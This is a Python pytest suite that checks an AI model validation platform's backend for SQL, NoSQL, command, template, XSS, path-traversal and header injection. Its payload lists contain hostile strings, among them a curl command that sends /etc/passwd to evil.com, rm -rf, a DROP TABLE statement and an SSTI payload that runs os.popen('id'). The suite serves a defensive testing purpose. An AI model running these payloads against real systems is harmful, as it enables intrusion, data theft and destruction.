#!/usr/bin/env python3
"""
Injection Vulnerabilities Security Test Suite
=============================================

This test suite validates protection against various injection attacks in the
AI Model Validation Platform, including SQL injection, NoSQL injection,
command injection, and other code injection vulnerabilities.

CRITICAL INJECTION TESTS:
1. SQL injection in query parameters and request bodies
2. NoSQL injection attempts
3. Command injection in file operations
4. Script injection in user inputs
5. Template injection vulnerabilities
6. LDAP injection (if applicable)
7. Header injection attacks

These tests should FAIL initially if vulnerabilities exist, then PASS after fixes.
"""

import pytest
import json
import base64
import urllib.parse
from typing import Dict, List, Any
from unittest.mock import patch, MagicMock

import sys
sys.path.append('/home/rigade/Testing/ai-model-validation-platform/backend')

from fastapi.testclient import TestClient
from sqlalchemy.orm import sessionmaker
from sqlalchemy import create_engine, text

# Import the main application
from main import app
from database import Base


class InjectionTestHarness:
    """Test harness for injection vulnerability testing"""
    
    def __init__(self):
        self.client = TestClient(app)
        
        # Setup test database
        self.test_engine = create_engine("sqlite:///./test_injection.db", echo=False)
        Base.metadata.create_all(bind=self.test_engine)
        TestingSessionLocal = sessionmaker(bind=self.test_engine)
        self.test_session = TestingSessionLocal()
        
        # Mock authentication for testing
        self.auth_headers = {
            "Authorization": "Bearer test_token_for_injection_testing",
            "X-User-ID": "test-user-id"
        }
        
        # Common injection payloads
        self.sql_injection_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE projects; --",
            "' UNION SELECT * FROM users --",
            "1' OR 1=1 --",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "' AND (SELECT COUNT(*) FROM projects) > 0 --",
            "'; INSERT INTO projects (name) VALUES ('hacked') --",
            "1; SELECT password FROM users WHERE username='admin' --"
        ]
        
        self.nosql_injection_payloads = [
            "'; return true; //",
            "' || '1'=='1",
            "'; return db.users.findOne(); //",
            {"$ne": None},
            {"$gt": ""},
            {"$where": "function() { return true; }"}
        ]
        
        self.command_injection_payloads = [
            "; ls -la",
            "| whoami",
            "& ping google.com",
            "; cat /etc/passwd",
            "$(cat /etc/passwd)",
            "`id`",
            "; rm -rf /tmp/*",
            "| netstat -an",
            "&& curl http://evil.com/steal?data=$(cat /etc/passwd)"
        ]
        
        self.script_injection_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "{{7*7}}",  # Template injection
            "${7*7}",   # Template injection  
            "#{7*7}",   # Template injection
            "<%=7*7%>", # Template injection
            "{{config}}", # Flask template injection
            "{{request}}" # Flask template injection
        ]
    
    def cleanup(self):
        """Clean up test resources"""
        self.test_session.close()
        import os
        if os.path.exists("./test_injection.db"):
            os.remove("./test_injection.db")


@pytest.fixture
def injection_harness():
    """Fixture providing injection test harness"""
    harness = InjectionTestHarness()
    yield harness
    harness.cleanup()


class TestSQLInjection:
    """Tests for SQL injection vulnerabilities"""
    
    def test_sql_injection_in_project_queries(self, injection_harness):
        """Test for SQL injection in project-related queries"""
        # Test GET requests with SQL injection in parameters
        for payload in injection_harness.sql_injection_payloads:
            # Test project ID parameter
            response = injection_harness.client.get(
                f"/api/projects/{payload}",
                headers=injection_harness.auth_headers
            )
            
            # Should return 400/404/422, not 500 or 200 with unexpected data
            assert response.status_code in [400, 404, 422], \
                f"SQL INJECTION: Project query vulnerable to: {payload}"
            
            # Ensure response doesn't contain evidence of SQL injection success
            response_text = response.text.lower()
            assert "syntax error" not in response_text, \
                f"SQL error exposed with payload: {payload}"
            assert "sqlite" not in response_text, \
                f"Database details leaked with payload: {payload}"
            assert "mysql" not in response_text, \
                f"Database details leaked with payload: {payload}"
    
    def test_sql_injection_in_search_parameters(self, injection_harness):
        """Test for SQL injection in search functionality"""
        for payload in injection_harness.sql_injection_payloads:
            # Test search query parameter
            response = injection_harness.client.get(
                f"/api/projects?search={urllib.parse.quote(payload)}",
                headers=injection_harness.auth_headers
            )
            
            # Should handle injection safely
            assert response.status_code in [200, 400, 422], \
                f"SQL INJECTION in search: {payload}"
            
            if response.status_code == 200:
                # If search succeeds, should not return unexpected data
                data = response.json()
                if isinstance(data, list):
                    # Should not return admin or system data from injection
                    for item in data:
                        if isinstance(item, dict):
                            item_str = str(item).lower()
                            assert "password" not in item_str, \
                                f"Password data leaked via injection: {payload}"
                            assert "admin" not in item_str or "admin" in payload.lower(), \
                                f"Admin data leaked via injection: {payload}"
    
    def test_sql_injection_in_request_bodies(self, injection_harness):
        """Test for SQL injection in JSON request bodies"""
        for payload in injection_harness.sql_injection_payloads:
            # Test project creation with SQL injection in fields
            project_data = {
                "name": payload,
                "description": payload,
                "cameraModel": payload,
                "cameraView": "Front-facing VRU",
                "signalType": "GPIO"
            }
            
            response = injection_harness.client.post(
                "/api/projects",
                json=project_data,
                headers=injection_harness.auth_headers
            )
            
            # Should either succeed with escaped data or fail validation
            if response.status_code == 201:
                # If creation succeeds, verify payload was properly escaped
                created_project = response.json()
                assert created_project["name"] == payload, \
                    "Data should be stored as-is, but safely escaped in queries"
            else:
                # Should fail with proper error handling, not SQL errors
                assert response.status_code in [400, 422], \
                    f"SQL injection caused unexpected error: {response.status_code}"
                
                error_text = response.text.lower()
                assert "syntax error" not in error_text, \
                    f"SQL error exposed in response: {payload}"
    
    def test_blind_sql_injection_resistance(self, injection_harness):
        """Test resistance to blind SQL injection attacks"""
        # Time-based blind SQL injection payloads
        time_based_payloads = [
            "'; WAITFOR DELAY '00:00:05' --",
            "' OR (SELECT COUNT(*) FROM projects WHERE name LIKE '%test%') > 0 --",
            "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --"
        ]
        
        import time
        
        for payload in time_based_payloads:
            start_time = time.time()
            
            response = injection_harness.client.get(
                f"/api/projects/{urllib.parse.quote(payload)}",
                headers=injection_harness.auth_headers
            )
            
            elapsed_time = time.time() - start_time
            
            # Response should not be significantly delayed (indicating time-based injection)
            assert elapsed_time < 2.0, \
                f"BLIND SQL INJECTION: Time-based injection successful with payload: {payload}"
            
            assert response.status_code in [400, 404, 422], \
                f"BLIND SQL INJECTION: Unexpected response to payload: {payload}"


class TestNoSQLInjection:
    """Tests for NoSQL injection vulnerabilities"""
    
    def test_nosql_injection_in_json_queries(self, injection_harness):
        """Test for NoSQL injection in JSON query parameters"""
        for payload in injection_harness.nosql_injection_payloads:
            if isinstance(payload, dict):
                # Test MongoDB-style injection
                query_data = {"filter": payload}
                response = injection_harness.client.post(
                    "/api/projects/search",
                    json=query_data,
                    headers=injection_harness.auth_headers
                )
                
                # Should not return unauthorized data
                if response.status_code == 200:
                    data = response.json()
                    # Should not return all projects due to NoSQL injection
                    assert not (isinstance(data, list) and len(data) > 100), \
                        f"NOSQL INJECTION: Payload returned excessive data: {payload}"
            else:
                # Test string-based NoSQL injection
                response = injection_harness.client.get(
                    f"/api/projects?filter={urllib.parse.quote(str(payload))}",
                    headers=injection_harness.auth_headers
                )
                
                assert response.status_code in [200, 400, 422], \
                    f"NOSQL INJECTION: Unexpected error with payload: {payload}"


class TestCommandInjection:
    """Tests for command injection vulnerabilities"""
    
    def test_command_injection_in_file_uploads(self, injection_harness):
        """Test for command injection in file upload processing"""
        for payload in injection_harness.command_injection_payloads:
            # Test malicious filename
            malicious_filename = f"test{payload}.mp4"
            test_content = b"fake_video_content"
            
            files = {"file": (malicious_filename, test_content, "video/mp4")}
            data = {"projectId": "test-project-id"}
            
            response = injection_harness.client.post(
                "/api/videos/upload",
                files=files,
                data=data,
                headers=injection_harness.auth_headers
            )
            
            # Should handle malicious filename safely
            assert response.status_code in [200, 400, 422], \
                f"COMMAND INJECTION: File upload failed unexpectedly with: {payload}"
            
            # Check response doesn't contain command execution output
            response_text = response.text.lower()
            assert "bin" not in response_text, \
                f"Command output detected in response: {payload}"
            assert "root" not in response_text, \
                f"Command output detected in response: {payload}"
            assert "uid=" not in response_text, \
                f"Command output detected in response: {payload}"
    
    def test_command_injection_in_video_processing(self, injection_harness):
        """Test for command injection in video processing parameters"""
        for payload in injection_harness.command_injection_payloads:
            # Test video processing with malicious parameters
            processing_data = {
                "videoId": "test-video-id",
                "outputFormat": f"mp4{payload}",
                "quality": f"high{payload}",
                "framerate": f"30{payload}"
            }
            
            response = injection_harness.client.post(
                "/api/videos/process",
                json=processing_data,
                headers=injection_harness.auth_headers
            )
            
            # Should reject or safely handle malicious parameters
            if response.status_code not in [200, 201]:
                assert response.status_code in [400, 404, 422], \
                    f"COMMAND INJECTION: Unexpected error with payload: {payload}"
    
    def test_path_traversal_command_injection(self, injection_harness):
        """Test for path traversal combined with command injection"""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
            "file.mp4; cat /etc/passwd",
            "video.mp4 && ls -la /"
        ]
        
        for payload in path_traversal_payloads:
            # Test in file path parameter
            response = injection_harness.client.get(
                f"/api/videos/download/{urllib.parse.quote(payload)}",
                headers=injection_harness.auth_headers
            )
            
            assert response.status_code in [400, 404, 403], \
                f"PATH TRAVERSAL INJECTION: Payload succeeded: {payload}"
            
            # Check response doesn't contain file system data
            response_text = response.text
            assert "root:" not in response_text, \
                f"File system data leaked: {payload}"
            assert "/bin/bash" not in response_text, \
                f"File system data leaked: {payload}"


class TestScriptInjection:
    """Tests for script and template injection vulnerabilities"""
    
    def test_xss_in_project_names(self, injection_harness):
        """Test for XSS vulnerabilities in project names and descriptions"""
        for payload in injection_harness.script_injection_payloads:
            project_data = {
                "name": payload,
                "description": f"Test project with payload: {payload}",
                "cameraModel": "TestCam",
                "cameraView": "Front-facing VRU",
                "signalType": "GPIO"
            }
            
            response = injection_harness.client.post(
                "/api/projects",
                json=project_data,
                headers=injection_harness.auth_headers
            )
            
            if response.status_code == 201:
                # Verify response is properly escaped
                project = response.json()
                stored_name = project["name"]
                
                # Should not contain unescaped script tags
                assert "<script>" not in stored_name or "&lt;script&gt;" in stored_name, \
                    f"XSS INJECTION: Script not properly escaped: {payload}"
                
                # Test retrieval to ensure output encoding
                get_response = injection_harness.client.get(
                    f"/api/projects/{project['id']}",
                    headers=injection_harness.auth_headers
                )
                
                if get_response.status_code == 200:
                    retrieved_project = get_response.json()
                    retrieved_name = retrieved_project["name"]
                    
                    assert "<script>" not in retrieved_name or "&lt;script&gt;" in retrieved_name, \
                        f"XSS INJECTION: Script not escaped on output: {payload}"
    
    def test_template_injection_in_error_messages(self, injection_harness):
        """Test for template injection in error message generation"""
        template_payloads = [
            "{{7*7}}",
            "${7*7}",
            "<%=7*7%>",
            "{{config}}",
            "{{request.environ}}",
            "{{''.join(config)}}"
        ]
        
        for payload in template_payloads:
            # Try to trigger template injection in error messages
            response = injection_harness.client.get(
                f"/api/projects/{payload}",
                headers=injection_harness.auth_headers
            )
            
            # Check that template expressions are not evaluated
            response_text = response.text
            
            # Should not contain evaluated expressions
            assert "49" not in response_text or payload in response_text, \
                f"TEMPLATE INJECTION: Expression evaluated: {payload}"
            assert "environ" not in response_text, \
                f"TEMPLATE INJECTION: Config exposed: {payload}"
    
    def test_ssti_in_dynamic_content(self, injection_harness):
        """Test for Server-Side Template Injection in dynamic content"""
        ssti_payloads = [
            "{{config.items()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
            "<%=`id`%>",
            "{{7*'7'}}"  # Should output '7777777' if vulnerable
        ]
        
        for payload in ssti_payloads:
            # Test in various fields that might be rendered dynamically
            test_data = {
                "name": f"Test {payload}",
                "description": payload,
                "notes": payload
            }
            
            response = injection_harness.client.post(
                "/api/projects",
                json=test_data,
                headers=injection_harness.auth_headers
            )
            
            # Check response doesn't contain template evaluation results
            response_text = response.text
            assert "7777777" not in response_text, \
                f"SSTI INJECTION: Template evaluated: {payload}"
            assert "uid=" not in response_text, \
                f"SSTI INJECTION: Command executed: {payload}"


class TestHeaderInjection:
    """Tests for HTTP header injection vulnerabilities"""
    
    def test_crlf_injection_in_headers(self, injection_harness):
        """Test for CRLF injection in HTTP headers"""
        crlf_payloads = [
            "test\r\nX-Injected-Header: malicious",
            "test\nSet-Cookie: admin=true",
            "test%0d%0aX-Forwarded-For: 127.0.0.1",
            "test\r\n\r\n<script>alert('XSS')</script>",
            "normal_value\r\nLocation: http://evil.com"
        ]
        
        for payload in crlf_payloads:
            # Test in custom headers
            malicious_headers = injection_harness.auth_headers.copy()
            malicious_headers["X-Custom-Header"] = payload
            
            response = injection_harness.client.get(
                "/api/projects",
                headers=malicious_headers
            )
            
            # Check response headers for injection
            response_headers = dict(response.headers)
            
            # Should not contain injected headers
            assert "X-Injected-Header" not in response_headers, \
                f"HEADER INJECTION: Header injected: {payload}"
            assert not any("malicious" in str(v) for v in response_headers.values()), \
                f"HEADER INJECTION: Malicious content in headers: {payload}"
    
    def test_host_header_injection(self, injection_harness):
        """Test for Host header injection attacks"""
        malicious_hosts = [
            "evil.com",
            "127.0.0.1:evil.com",
            "localhost#evil.com",
            "evil.com/path",
            "[::1]:8080/evil.com"
        ]
        
        for host in malicious_hosts:
            # Test with malicious Host header
            headers = injection_harness.auth_headers.copy()
            headers["Host"] = host
            
            response = injection_harness.client.get(
                "/api/projects",
                headers=headers
            )
            
            # Should not reflect malicious host in response
            response_text = response.text
            if "evil.com" in response_text:
                # Only acceptable if it's in the original request context
                assert host in response_text, \
                    f"HOST INJECTION: Malicious host in response: {host}"


def run_comprehensive_injection_test():
    """Run comprehensive injection vulnerability test"""
    print("💉 Starting Comprehensive Injection Vulnerability Test")
    print("=" * 70)
    
    harness = InjectionTestHarness()
    test_results = []
    
    # Run injection tests
    test_classes = [
        TestSQLInjection,
        TestNoSQLInjection,
        TestCommandInjection,
        TestScriptInjection,
        TestHeaderInjection
    ]
    
    for test_class in test_classes:
        print(f"\n🧪 Running {test_class.__name__}")
        instance = test_class()
        
        for method_name in dir(instance):
            if method_name.startswith("test_"):
                print(f"  → {method_name}")
                try:
                    method = getattr(instance, method_name)
                    method(harness)
                    test_results.append({"test": method_name, "status": "PASS"})
                    print("    ✅ PASS")
                except AssertionError as e:
                    test_results.append({"test": method_name, "status": "FAIL", "error": str(e)})
                    print(f"    🚨 FAIL: {e}")
                except Exception as e:
                    test_results.append({"test": method_name, "status": "ERROR", "error": str(e)})
                    print(f"    ⚠️ ERROR: {e}")
    
    harness.cleanup()
    
    # Generate summary
    total_tests = len(test_results)
    passed_tests = len([r for r in test_results if r["status"] == "PASS"])
    failed_tests = len([r for r in test_results if r["status"] == "FAIL"])
    error_tests = len([r for r in test_results if r["status"] == "ERROR"])
    
    print("\n" + "=" * 70)
    print("📊 INJECTION VULNERABILITY TEST SUMMARY")
    print("=" * 70)
    print(f"Total Tests: {total_tests}")
    print(f"Passed: {passed_tests} ✅")
    print(f"Failed: {failed_tests} 🚨")
    print(f"Errors: {error_tests} ⚠️")
    
    if failed_tests > 0:
        print(f"\n🚨 CRITICAL: {failed_tests} injection vulnerabilities detected!")
        print("Review the test output above for specific security issues.")
        return False
    else:
        print("\n✅ All injection vulnerability tests passed!")
        return True


if __name__ == "__main__":
    success = run_comprehensive_injection_test()
    exit(0 if success else 1)